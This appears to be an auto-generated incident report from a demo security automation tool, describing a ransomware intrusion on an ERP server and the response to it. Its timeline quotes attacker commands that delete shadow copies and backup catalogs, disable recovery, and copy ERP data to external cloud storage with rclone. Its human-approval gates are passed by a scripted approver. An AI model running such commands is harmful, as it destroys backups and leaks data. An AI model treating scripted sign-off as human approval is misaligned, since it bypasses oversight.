# Incident report — INC-CE53A6C0

**Alert:** ALR-2026-0904-0345 · EDR-Shadow-Copy-Deletion · 2026-09-04 01:43 UTC  
**Title:** Volume shadow copies deleted on SRV-ERP-01 by svc_backup  
**Final state:** `resolved` · **Ticket:** TKT-57C94099 · **Reasoning back-end:** heuristic

## Executive summary

Volume shadow copies deleted on SRV-ERP-01 by svc_backup was triaged as true_positive (critical, confidence 0.97) and categorised as ransomware. Root cause: Admin VPN session accepted after repeated MFA push prompts (MFA fatigue) from a ransomware-affiliate IP; attacker then pivoted to the backup service account and RDP'd into production servers. Data at risk: SAP ERP (finance, payroll, procurement) — restricted data, backups being destroyed 10 containment action(s) were executed (some with human approval. Final state: resolved.

## Triage

| Field | Value |
|---|---|
| Verdict | true_positive |
| Severity | critical |
| Confidence | 0.97 |
| Category / playbook | ransomware |
| MITRE ATT&CK | T1078.002, T1021.001, T1490, T1567.002 |

**Rationale:** 2 suspicious process(es) on host per EDR; shadow copy / backup catalog deletion — classic ransomware precursor; bulk copy tooling (rclone) staging data to cloud storage; service account used for interactive/RDP logon, which policy forbids; activity outside business hours. Composite evidence score 0.95.

**Signals:** `suspicious_process_count`, `shadow_copy_deletion`, `backup_tampering`, `exfil_staging`, `service_account_interactive_logon`, `off_hours`, `user_privileged`, `user_service_account`

## Investigation

**Root cause:** Admin VPN session accepted after repeated MFA push prompts (MFA fatigue) from a ransomware-affiliate IP; attacker then pivoted to the backup service account and RDP'd into production servers.  
**Data at risk:** SAP ERP (finance, payroll, procurement) — restricted data, backups being destroyed  
**Lateral movement:** yes · **Confidence:** 0.9

**Affected hosts:** SRV-ERP-01, WS-IT-ADM-03, SRV-FS-03  
**Affected users:** svc_backup, r.otaibi

### Findings

- 91.219.237.18 is known-bad (ransomware-affiliate, vpn-bruteforce, initial-access-broker).
- SRV-ERP-01: vssadmin.exe (pid 7788) at C:\Windows\System32\vssadmin.exe — cmd: vssadmin.exe delete shadows /all /quiet
- SRV-ERP-01: rclone.exe (pid 7801) at C:\Users\svc_backup\AppData\Local\Temp\rclone.exe — unsigned, cmd: rclone.exe copy D:\SAP\exports mega:staging --transfers 8
- Service account performed interactive/RDP logons across hosts — not backup-job behaviour.
- rclone is copying ERP export data to external cloud storage — exfiltration in progress.

### Indicators of compromise

- `91.219.237.18` (ip)
- `31.216.148.10` (ip)
- `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` (hash)
- `2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae` (hash)

### Timeline

| Time (UTC) | Source | Event |
|---|---|---|
| 01:15:32 | vpn | [vpn_login] r.otaibi@91.219.237.18: GlobalProtect login, MFA satisfied via push (approved on 3rd prompt in 4 minutes) |
| 01:22:07 | windows_security | [logon] svc_backup@WS-IT-ADM-03: Logon type 2 (interactive) - service account interactive logon is not permitted by policy |
| 01:30:15 | windows_security | [logon] svc_backup@SRV-ERP-01: Logon type 10 (RemoteInteractive/RDP) from WS-IT-ADM-03 |
| 01:41:50 | edr | [process_start] svc_backup@SRV-ERP-01: cmd.exe spawned vssadmin.exe delete shadows /all /quiet (pid 7788) |
| 01:42:12 | edr | [process_start] svc_backup@SRV-ERP-01: cmd.exe spawned wbadmin.exe delete catalog -quiet |
| 01:42:30 | edr | [process_start] svc_backup@SRV-ERP-01: bcdedit.exe /set {default} recoveryenabled No |
| 01:44:05 | edr | [process_start] svc_backup@SRV-ERP-01: rclone.exe copy D:\SAP\exports mega:staging --transfers 8 (pid 7801), 3.2 GB queued |
| 01:45:40 | windows_security | [logon] svc_backup@SRV-FS-03: Logon type 10 (RDP) from SRV-ERP-01 |

## Response actions

| Action | Tier | Gate | Status | Verified | Decision |
|---|---|---|---|---|---|
| `edr.kill_process(host=SRV-ERP-01, pid=7788)` | 1 | auto | executed | ✅ |  |
| `edr.kill_process(host=SRV-ERP-01, pid=7801)` | 1 | auto | executed | ✅ |  |
| `firewall.block_ip(ip=91.219.237.18)` | 1 | auto | executed | ✅ |  |
| `firewall.block_ip(ip=31.216.148.10)` | 1 | auto | executed | ✅ |  |
| `edr.isolate_host(host=SRV-ERP-01)` | 3 | human | executed | ✅ | approved by auto-gateway (demo) — approved by scripted gateway |
| `edr.isolate_host(host=WS-IT-ADM-03)` | 2 | auto | executed | ✅ |  |
| `edr.isolate_host(host=SRV-FS-03)` | 3 | human | executed | ✅ | approved by auto-gateway (demo) — approved by scripted gateway |
| `iam.disable_user(user=svc_backup)` | 3 | human | executed | ✅ | approved by auto-gateway (demo) — approved by scripted gateway |
| `iam.revoke_sessions_and_reset_password(user=r.otaibi)` | 3 | human | executed | ✅ | approved by auto-gateway (demo) — approved by scripted gateway |
| `edr.collect_forensics(host=SRV-ERP-01)` | 1 | auto | executed | – |  |

## Communications

- **ticket** → soc queue: Ticket TKT-57C94099 opened
- **chat** → #soc-incidents: INC-CE53A6C0
- **chat** → #soc-incidents: INC-CE53A6C0
- **chat** → #soc-approvals: INC-CE53A6C0
- **chat** → #soc-approvals: INC-CE53A6C0
- **chat** → #soc-approvals: INC-CE53A6C0
- **chat** → #soc-approvals: INC-CE53A6C0
- **email** → f.zahrani@corp.example: [Security] INC-CE53A6C0 — Volume shadow copies deleted on SRV-ERP-01 by svc_backup (asset owner notice)
- **email** → ir-lead@corp.example: [Security] INC-CE53A6C0 — Volume shadow copies deleted on SRV-ERP-01 by svc_backup (ir lead notice)
- **chat** → #soc-incidents: INC-CE53A6C0

## State history

| Time | From | To | Actor | Note |
|---|---|---|---|---|
| 20:23:15 | new | triaged | commander | true_positive/critical/0.97 → ransomware |
| 20:23:15 | triaged | investigating | commander |  |
| 20:23:15 | investigating | planning | commander |  |
| 20:23:15 | planning | containing | commander |  |
| 20:23:15 | containing | contained | commander | 10 action(s) executed and verified |
| 20:23:15 | contained | resolved | commander | contained; report written; ticket resolved pending post-incident review |

## Notes

- Playbook ransomware; notify roles ['asset_owner', 'ir_lead']

_Generated by SOC Autopilot. Every tool call and decision is in the hash-chained audit log (`out/audit.jsonl`)._
